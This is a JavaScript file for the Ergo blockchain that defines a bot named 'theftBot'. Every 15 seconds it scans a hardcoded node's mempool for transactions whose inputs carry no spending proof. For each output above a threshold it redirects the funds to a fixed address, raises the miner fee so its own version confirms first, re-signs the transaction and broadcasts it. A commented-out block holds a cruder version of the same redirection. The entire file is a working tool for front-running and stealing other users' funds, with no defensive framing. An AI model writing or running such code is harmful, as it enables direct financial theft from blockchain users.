import { currentHeight, get, postTx, sendTx } from "./src/explorer.js";
import JSONBigInt from 'json-bigint';
import { signTransaction } from "./src/wasm.js";
let ergolib = import('ergo-lib-wasm-nodejs');


const MINER_ERGOTREE = '1005040004000e36100204a00b08cd0279be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798ea02d192a39a8cc7a701730073011001020402d19683030193a38cc7b2a57300000193c2b2a57301007473027303830108cdeeac93b1a57304';
const nodeApi = 'http://51.77.221.96:9053/';

async function getRequestNode(url) {
    
    return await get(nodeApi + url).then(res => {
        return { data: res };
    });
}

async function getUnconfirmedTxs() {
    const res = await getRequestNode(`transactions/unconfirmed?limit=100`);
    return res.data;
}

export async function boxByIdMempool(id) {
    const res = await getRequestNode(`utxo/withPool/byId/${id}`);
    //console.log("boxByIdMempool", res)
    return res.data;
}

export async function postTxNode(json) {
    const res = await postTx(nodeApi+'transactions', json);
    return res;
}

async function theftBot() {
    console.log("theftBot")
    const unconfirmedTx = await getUnconfirmedTxs();
    //console.log("unconfirmedTx", unconfirmedTx)
    for (const tx of unconfirmedTx) {
        //console.log("transaction id", tx.id);
        var hasEmptyProof = true;
        for (const input of tx.inputs) {
            //console.log("input.spendingProof", input.spendingProof);
            if (input.spendingProof.proofBytes !== '') {
                hasEmptyProof = false;
            }
        }
        if (hasEmptyProof) {
            console.log("transaction id empty proof", tx.id);
            //console.log("transaction outputs", tx.outputs);
            const minerFeeBoxIndex = tx.outputs.findIndex(output => output.ergoTree === MINER_ERGOTREE);

//
//
//          for (var i = 0; i < tx.outputs.length; i++) {
//              if (tx.outputs[i].ergoTree !== MINER_ERGOTREE && tx.outputs[i].value > 2000000) {
//                  var newSignedTx = { ...tx };
//                  //newSignedTx.outputs[i].value = tx.outputs[i].value - 1500000;
//                  newSignedTx.outputs[i].ergoTree = '0008cd02183dcf970a472d5451d4281dd5a69781775775bbe322a7567964469d10de1edb';
//                  //newSignedTx.outputs[minerFeeBoxIndex].value = tx.outputs[minerFeeBoxIndex].value + 1500000;
//                  const txId = await postTxNode(newSignedTx);
//                  if (txId) {
//                      console.log("##########################");
//                      console.log("####### txId", txId);
//                      console.log("##########################");
//                  }
//              }
//
//          }
//

            const wallet = (await ergolib).Wallet.from_mnemonic("", "");
            const creationHeight = await currentHeight();
//
            var newInputs = (await Promise.all(tx.inputs.map(async input => await boxByIdMempool(input.boxId)))).flat();
            for (var input of newInputs) {
                input['extension'] = {}
            }
            var newdataInputs = (await Promise.all(tx.dataInputs.map(async input => await boxByIdMempool(input.boxId)))).flat();
            for (var dataInput of newdataInputs) {
                dataInput['extension'] = {}
            }
//
            for (var i = 0; i < tx.outputs.length; i++) {
                //console.log("output ", i, tx.outputs[i].ergoTree !== MINER_ERGOTREE, tx.outputs[i].value > 2000000);
                if (tx.outputs[i].ergoTree !== MINER_ERGOTREE && tx.outputs[i].value > 2000000) {
                    var newOutputs = [...tx.outputs];
                    newOutputs[i].boxId = undefined;
                    newOutputs[i].value = tx.outputs[i].value - 1500000;
                    newOutputs[i].ergoTree = '0008cd02183dcf970a472d5451d4281dd5a69781775775bbe322a7567964469d10de1edb';
                    newOutputs[minerFeeBoxIndex].value = tx.outputs[minerFeeBoxIndex].value + 1500000;
                    newOutputs[minerFeeBoxIndex].boxId = undefined;
                    const newUnsignedTxJSON = {
                        inputs: newInputs,
                        dataInputs: newdataInputs,
                        outputs: newOutputs,
                    }
                    //console.log("newUnsignedTxJSON", tx.outputs[i], newOutputs[i]);
                    try {
                        const signedTx = await signTransaction(newUnsignedTxJSON, newInputs, newdataInputs, wallet);
                        console.log("signedTx", signedTx);
                        const txId = await sendTx(signedTx);
                        console.log("##########################");
                        console.log("####### txId", txId);
                        console.log("##########################");
                    } catch (e) {
                        console.log("output ",i, e)
                    }
//
                }
//
//
                //const unsignedTx = (await ergolib).UnsignedTransaction.from_json(JSONBigInt.stringify(newUnsignedTxJSON));
//
            }





            //const inputsWASM = (await ergolib).ErgoBoxes.from_boxes_json(newInputs);
            //const dataListWASM = new (await ergolib).ErgoBoxAssetsDataList();
            //const boxSelection = new (await ergolib).BoxSelection(inputsWASM, dataListWASM);


        }



    }

}

setInterval(theftBot, 15000);